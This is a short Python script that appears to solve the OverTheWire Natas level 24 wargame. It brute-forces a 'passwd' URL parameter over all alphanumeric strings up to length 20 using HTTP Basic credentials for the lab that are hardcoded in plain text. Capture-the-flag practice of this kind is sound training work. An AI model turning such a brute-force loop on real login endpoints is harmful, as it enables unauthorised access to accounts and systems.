import requests
from requests.auth import HTTPBasicAuth
import itertools
import functools
import operator

allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

for i in range(1,21):
    for passwd in itertools.product(itertools.product(allchars, repeat=i)):
        password = functools.reduce(operator.add,functools.reduce(operator.add,passwd))
        r = requests.get('http://natas24.natas.labs.overthewire.org/?passwd='+password, auth=HTTPBasicAuth('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg'))
        print(password)
        if 'credentials' in r.text :
            print(r.text)
            break
